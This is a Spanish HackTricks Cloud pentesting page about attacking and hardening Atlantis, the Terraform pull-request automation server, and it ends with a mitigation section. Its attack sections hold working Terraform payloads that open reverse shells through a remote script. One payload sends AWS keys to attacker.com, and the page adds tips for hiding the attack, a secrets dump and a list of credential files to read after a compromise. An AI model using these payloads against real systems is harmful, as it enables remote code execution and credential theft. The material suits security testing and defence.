# Seguridad de Atlantis

<details>

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
{% endhint %}

## Informaci칩n B치sica

B치sicamente, Atlantis te ayuda a ejecutar terraform desde solicitudes de extracci칩n de tu servidor git.

![](<../.gitbook/assets/image (161).png>)

## Laboratorio Local

1. Ve a la **p치gina de lanzamientos de atlantis** en [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) y **descarga** la que te convenga.
2. Crea un **token personal** (con acceso al repositorio) de tu usuario de **github**
3. Ejecuta `./atlantis testdrive` y crear치 un **repositorio de demostraci칩n** que puedes usar para **comunicarte con atlantis**
1. Puedes acceder a la p치gina web en 127.0.0.1:4141

## Acceso a Atlantis

### Credenciales del Servidor Git

**Atlantis** admite varios hosts de git como **Github**, **Gitlab**, **Bitbucket** y **Azure DevOps**.\
Sin embargo, para acceder a los repositorios en esas plataformas y realizar acciones, necesita tener cierto **acceso privilegiado otorgado a ellos** (al menos permisos de escritura).\
[**La documentaci칩n**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) recomienda crear un usuario en estas plataformas espec칤ficamente para Atlantis, pero algunas personas podr칤an usar cuentas personales.

{% hint style="warning" %}
En cualquier caso, desde la perspectiva de un atacante, la **cuenta de Atlantis** va a ser muy **interesante de comprometer**.
{% endhint %}

### Webhooks

Atlantis utiliza opcionalmente [**Secretos de Webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) para validar que los **webhooks** que recibe de tu host de Git son **leg칤timos**.

Una forma de confirmar esto ser칤a **permitir que las solicitudes solo provengan de las IPs** de tu host de Git, pero una forma m치s f치cil es usar un Secreto de Webhook.

Ten en cuenta que a menos que uses un servidor privado de github o bitbucket, deber치s exponer los puntos finales de webhook a Internet.

{% hint style="warning" %}
Atlantis va a estar **exponiendo webhooks** para que el servidor git le env칤e informaci칩n. Desde la perspectiva de un atacante, ser칤a interesante saber **si puedes enviarle mensajes**.
{% endhint %}

### Credenciales del Proveedor <a href="#provider-credentials" id="provider-credentials"></a>

[Desde la documentaci칩n:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis ejecuta Terraform simplemente **ejecutando los comandos `terraform plan` y `apply`** en el servidor **donde Atlantis est치 alojado**. Al igual que cuando ejecutas Terraform localmente, Atlantis necesita credenciales para tu proveedor espec칤fico.

Depende de ti c칩mo [proporcionar credenciales](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) para tu proveedor espec칤fico a Atlantis:

* El Chart de Helm de Atlantis y el M칩dulo de AWS Fargate tienen sus propios mecanismos para las credenciales del proveedor. Lee sus documentaciones.
* Si est치s ejecutando Atlantis en la nube, muchas nubes tienen formas de dar acceso a la API de la nube a las aplicaciones que se ejecutan en ellas, por ejemplo:
* [Roles de EC2 de AWS](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Buscar "EC2 Role")
* [Cuentas de Servicio de Instancia de GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Muchos usuarios establecen variables de entorno, por ejemplo `AWS_ACCESS_KEY`, donde se est치 ejecutando Atlantis.
* Otros crean los archivos de configuraci칩n necesarios, por ejemplo `~/.aws/credentials`, donde se est치 ejecutando Atlantis.
* Usa el [Proveedor de HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) para obtener credenciales del proveedor.

{% hint style="warning" %}
El **contenedor** donde **Atlantis** est치 **ejecut치ndose** probablemente **contendr치 credenciales privilegiadas** para los proveedores (AWS, GCP, Github...) que Atlantis est치 gestionando a trav칠s de Terraform.
{% endhint %}

### P치gina Web

Por defecto, Atlantis ejecutar치 una **p치gina web en el puerto 4141 en localhost**. Esta p치gina simplemente te permite habilitar/deshabilitar la aplicaci칩n de atlantis y verificar el estado del plan de los repositorios y desbloquearlos (no permite modificar cosas, por lo que no es tan 칰til).

Probablemente no la encontrar치s expuesta a Internet, pero parece que por defecto **no se necesitan credenciales** para acceder (y si se necesitan, `atlantis`:`atlantis` son las **predeterminadas**).

## Configuraci칩n del Servidor

La configuraci칩n de `atlantis server` se puede especificar a trav칠s de banderas de l칤nea de comandos, variables de entorno, un archivo de configuraci칩n o una combinaci칩n de los tres.

* Puedes encontrar [**aqu칤 la lista de banderas**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) admitidas por el servidor Atlantis
* Puedes encontrar [**aqu칤 c칩mo transformar una opci칩n de configuraci칩n en una variable de entorno**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Los valores se **eligen en este orden**:

1. Banderas
2. Variables de Entorno
3. Archivo de Configuraci칩n

{% hint style="warning" %}
Ten en cuenta que en la configuraci칩n podr칤as encontrar valores interesantes como **tokens y contrase침as**.
{% endhint %}

### Configuraci칩n de Repositorios

Algunas configuraciones afectan **c칩mo se gestionan los repositorios**. Sin embargo, es posible que **cada repositorio requiera ajustes diferentes**, por lo que hay formas de especificar cada repositorio. Este es el orden de prioridad:

1. Archivo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Este archivo se puede utilizar para especificar c칩mo atlantis deber칤a tratar el repositorio. Sin embargo, por defecto algunas claves no se pueden especificar aqu칤 sin algunas banderas que lo permitan.
1. Probablemente sea necesario permitirlo con banderas como `allowed_overrides` o `allow_custom_workflows`
2. [**Configuraci칩n del Lado del Servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Puedes pasarla con la bandera `--repo-config` y es un yaml que configura nuevos ajustes para cada repositorio (admite regexes)
3. Valores **predeterminados**
#### Protecciones de PR

Atlantis permite indicar si deseas que el **PR** sea **`aprobado`** por otra persona (incluso si no est치 configurado en la protecci칩n de la rama) y/o sea **`fusionable`** (protecciones de rama aprobadas) **antes de ejecutar apply**. Desde un punto de vista de seguridad, se recomienda configurar ambas opciones.

En caso de que `allowed_overrides` sea True, esta configuraci칩n puede ser **sobrescrita en cada proyecto por el archivo `/atlantis.yml`**.

#### Scripts

La configuraci칩n del repositorio puede **especificar scripts** para ejecutar [**antes**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) y [**despu칠s**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) de que se ejecute un **flujo de trabajo**.

No hay ninguna opci칩n que permita **especificar** estos scripts en el **archivo `/atlantis.yml`** del repositorio.

#### Flujo de trabajo

En la configuraci칩n del repositorio (configuraci칩n del lado del servidor) puedes [**especificar un nuevo flujo de trabajo predeterminado**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), o [**crear nuevos flujos de trabajo personalizados**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Tambi칠n puedes **especificar** qu칠 **repositorios** pueden **acceder** a los **nuevos** generados.\
Luego, puedes permitir que el archivo **atlantis.yaml** de cada repositorio **especifique el flujo de trabajo a utilizar**.

{% hint style="danger" %}
Si la bandera de [**configuraci칩n del lado del servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est치 configurada como **True**, los flujos de trabajo pueden ser **especificados** en el archivo **`atlantis.yaml`** de cada repositorio. Tambi칠n potencialmente se necesita que **`allowed_overrides`** especifique tambi칠n **`workflow`** para **sobrescribir el flujo de trabajo** que se va a utilizar.\
B치sicamente esto dar치 **RCE en el servidor de Atlantis a cualquier usuario que pueda acceder a ese repositorio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Verificaci칩n de Pol칤ticas con Conftest

Atlantis admite la ejecuci칩n de **pol칤ticas** de [**conftest**](https://www.conftest.dev/) en el lado del **servidor** contra la salida del plan. Algunos casos de uso comunes para utilizar este paso incluyen:

* Denegar el uso de una lista de m칩dulos
* Afirmar atributos de un recurso en el momento de la creaci칩n
* Detectar eliminaciones no intencionales de recursos
* Prevenir riesgos de seguridad (es decir, exponer puertos seguros al p칰blico)

Puedes ver c칩mo configurarlo en [**la documentaci칩n**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Comandos de Atlantis

En [**la documentaci칩n**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) puedes encontrar las opciones que puedes utilizar para ejecutar Atlantis:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Ataques

{% hint style="warning" %}
Si durante la explotaci칩n encuentras este **error**: `Error: Error acquiring the state lock`

Puedes solucionarlo ejecutando:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Plan RCE de Atlantis - Modificaci칩n de configuraci칩n en nuevo PR

Si tienes acceso de escritura sobre un repositorio, podr치s crear una nueva rama en 칠l y generar un PR. Si puedes **ejecutar `atlantis plan`** (o tal vez se ejecute autom치ticamente) **podr치s realizar una RCE dentro del servidor de Atlantis**.

Puedes hacer esto haciendo que [**Atlantis cargue una fuente de datos externa**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Simplemente coloca un payload como el siguiente en el archivo `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Ataque m치s sigiloso

Puedes realizar este ataque de una manera a칰n m치s sigilosa, siguiendo estas sugerencias:

* En lugar de agregar la reverse shell directamente al archivo de terraform, puedes **cargar un recurso externo** que contenga la reverse shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Puedes encontrar el c칩digo de rev shell en [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* En el recurso externo, usa la caracter칤stica **ref** para ocultar el **c칩digo de rev shell de terraform en una rama** dentro del repositorio, algo as칤: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **En lugar** de crear un **PR a master** para activar Atlantis, **crea 2 ramas** (test1 y test2) y crea un **PR de una a la otra**. Cuando hayas completado el ataque, simplemente **elimina el PR y las ramas**.

### Atlantis plan Secrets Dump

Puedes **filtrar secretos utilizados por terraform** ejecutando `atlantis plan` (`terraform plan`) colocando algo como esto en el archivo de terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis aplica RCE - Modificaci칩n de configuraci칩n en nueva PR

Si tienes acceso de escritura sobre un repositorio, podr치s crear una nueva rama en 칠l y generar una PR. Si puedes **ejecutar `atlantis apply`, podr치s realizar una RCE dentro del servidor de Atlantis**.

Sin embargo, generalmente necesitar치s evadir algunas protecciones:

- **Fusionable**: Si esta protecci칩n est치 configurada en Atlantis, solo podr치s ejecutar **`atlantis apply` si la PR es fusionable** (lo que significa que la protecci칩n de la rama debe ser evadida).
- Consulta posibles [**bypasses de protecciones de rama**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
- **Aprobado**: Si esta protecci칩n est치 configurada en Atlantis, **otro usuario debe aprobar la PR** antes de que puedas ejecutar `atlantis apply`
- Por defecto, puedes abusar del [**token de Gitbot para evadir esta protecci칩n**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Ejecutando **`terraform apply` en un archivo Terraform malicioso con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Solo necesitas asegurarte de que alg칰n payload como los siguientes termine en el archivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sigue las **sugerencias de la t칠cnica anterior** para realizar este ataque de una manera **m치s sigilosa**.

### Inyecci칩n de Par치metros en Terraform

Cuando se ejecuta `atlantis plan` o `atlantis apply`, terraform se ejecuta en segundo plano, puedes pasar comandos a terraform desde atlantis comentando algo as칤:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Algo que puedes pasar son variables de entorno que podr칤an ser 칰tiles para evadir algunas protecciones. Consulta las variables de entorno de Terraform en [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Flujo de Trabajo Personalizado

Ejecutar **comandos de compilaci칩n personalizados maliciosos** especificados en un archivo `atlantis.yaml`. Atlantis utiliza el archivo `atlantis.yaml` de la rama de la solicitud de extracci칩n, **no** de `master`.\
Esta posibilidad fue mencionada en una secci칩n anterior:

{% hint style="danger" %}
Si la bandera de configuraci칩n del lado del servidor [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) est치 establecida en **True**, los flujos de trabajo pueden ser **especificados** en el archivo **`atlantis.yaml`** de cada repositorio. Tambi칠n potencialmente se necesita que **`allowed_overrides`** especifique tambi칠n **`workflow`** para **sobrescribir el flujo de trabajo** que se va a utilizar.

Esto b치sicamente dar치 **RCE en el servidor de Atlantis a cualquier usuario que pueda acceder a ese repositorio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Saltar protecciones de plan/apply

Si la bandera de [**configuraci칩n del lado del servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _tiene_ `apply_requirements` configurado, es posible para un repositorio **modificar las protecciones de plan/apply para saltarlas**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### Secuestro de PR

Si alguien env칤a comentarios **`atlantis plan/apply` en tus pull requests v치lidos,** har치 que terraform se ejecute cuando no lo desees.

Adem치s, si no tienes configurado en la **protecci칩n de la rama** para pedir **reevaluar** cada PR cuando se **empuje un nuevo commit** a ella, alguien podr칤a **escribir configuraciones maliciosas** (ver escenarios anteriores) en la configuraci칩n de terraform, ejecutar `atlantis plan/apply` y obtener RCE.

Esta es la **configuraci칩n** en las protecciones de rama de Github:

![](<../.gitbook/assets/image (216).png>)

### Secreto de Webhook

Si logras **robar el secreto del webhook** utilizado o si no se est치 utilizando **ning칰n secreto de webhook**, podr칤as **llamar al webhook de Atlantis** e **invocar comandos de atlantis** directamente.

### Bitbucket

Bitbucket Cloud **no admite secretos de webhook**. Esto podr칤a permitir a los atacantes **falsificar solicitudes desde Bitbucket**. Aseg칰rate de permitir solo las IP de Bitbucket.

* Esto significa que un **atacante** podr칤a hacer **solicitudes falsas a Atlantis** que parecen provenir de Bitbucket.
* Si est치s especificando `--repo-allowlist` entonces solo podr칤an falsificar solicitudes relacionadas con esos repositorios, por lo que el da침o m치ximo que podr칤an hacer ser칤a planificar/aplicar en tus propios repositorios.
* Para prevenir esto, permite [las direcciones IP de Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (ver direcciones IP salientes de IPv4).

## Post-Explotaci칩n

Si lograste acceder al servidor o al menos obtuviste un LFI, hay algunas cosas interesantes que deber칤as intentar leer:

* `/home/atlantis/.git-credentials` Contiene credenciales de acceso a VCS
* `/atlantis-data/atlantis.db` Contiene credenciales de acceso a VCS con m치s informaci칩n
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Archivo de estado de Terraform
* Ejemplo: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Variables de entorno
* `/proc/[2-20]/cmdline` L칤nea de comandos de `atlantis server` (puede contener datos sensibles)

## Mitigaciones

### No Utilizar en Repositorios P칰blicos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Debido a que cualquiera puede comentar en pull requests p칰blicos, incluso con todas las mitigaciones de seguridad disponibles, sigue siendo peligroso ejecutar Atlantis en repositorios p칰blicos sin una configuraci칩n adecuada de los ajustes de seguridad.

### No Utilizar `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Si est치s ejecutando en un repositorio p칰blico (lo cual no se recomienda, ver arriba) no deber칤as establecer `--allow-fork-prs` (por defecto es falso) porque cualquiera puede abrir un pull request desde su fork a tu repositorio.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis requiere que especifiques una lista blanca de repositorios desde los cuales aceptar치 webhooks a trav칠s de la bandera `--repo-allowlist`. Por ejemplo:

* Repositorios espec칤ficos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Toda tu organizaci칩n: `--repo-allowlist=github.com/runatlantis/*`
* Todos los repositorios en tu instalaci칩n de GitHub Enterprise: `--repo-allowlist=github.tuempresa.com/*`
* Todos los repositorios: `--repo-allowlist=*`. 칔til cuando est치s en una red protegida pero peligroso sin establecer tambi칠n un secreto de webhook.

Esta bandera asegura que tu instalaci칩n de Atlantis no est칠 siendo utilizada con repositorios que no controlas. Consulta `atlantis server --help` para m치s detalles.

### Proteger la Planificaci칩n de Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Si los atacantes que env칤an pull requests con c칩digo malicioso de Terraform est치n en tu modelo de amenazas, debes ser consciente de que las aprobaciones de `terraform apply` no son suficientes. Es posible ejecutar c칩digo malicioso en un `terraform plan` utilizando el [origen de datos `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) o especificando un proveedor malicioso. Este c칩digo podr칤a exfiltrar tus credenciales.

Para prevenir esto, podr칤as:

1. Incluir proveedores en la imagen de Atlantis o en el host y denegar la salida en producci칩n.
2. Implementar el protocolo del registro de proveedores internamente y denegar la salida p칰blica, de esta manera controlas qui칠n tiene acceso de escritura al registro.
3. Modificar el [configuraci칩n del repositorio del lado del servidor](https://www.runatlantis.io/docs/server-side-repo-config.html) `plan` para validar contra el uso de proveedores o fuentes de datos no permitidos o PRs de usuarios no permitidos. Tambi칠n podr칤as agregar validaciones adicionales en este punto, por ejemplo, requerir un "ok" en el PR antes de permitir que el `plan` contin칰e. Conftest podr칤a ser 칰til aqu칤.

### Secretos de Webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis debe ejecutarse con secretos de Webhook configurados a trav칠s de las variables de entorno `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Incluso con la bandera `--repo-allowlist` establecida, sin un secreto de webhook, los atacantes podr칤an hacer solicitudes a Atlantis haci칠ndose pasar por un repositorio que est치 en la lista blanca. Los secretos de webhook aseguran que las solicitudes de webhook realmente provengan de tu proveedor de VCS (GitHub o GitLab).

Si est치s utilizando Azure DevOps, en lugar de secretos de webhook agrega un nombre de usuario y contrase침a b치sicos.

### Autenticaci칩n B치sica de Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps admite enviar un encabezado de autenticaci칩n b치sica en todos los eventos de webhook. Esto requiere usar una URL HTTPS para la ubicaci칩n de tu webhook.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Si est치s utilizando secretos de webhook pero tu tr치fico es a trav칠s de HTTP, los secretos de webhook podr칤an ser robados. Habilita SSL/HTTPS utilizando las banderas `--ssl-cert-file` y `--ssl-key-file`.

### Habilitar Autenticaci칩n en el Servidor Web de Atlantis <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Es muy recomendable habilitar la autenticaci칩n en el servicio web. Habilita BasicAuth usando `--web-basic-auth=true` y configura un nombre de usuario y una contrase침a usando las banderas `--web-username=tuUsuario` y `--web-password=tuContrase침a`.

Tambi칠n puedes pasar estos como variables de entorno `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=tuUsuario` y `ATLANTIS_WEB_PASSWORD=tuContrase침a`.

## Referencias

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* 춰Consulta los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
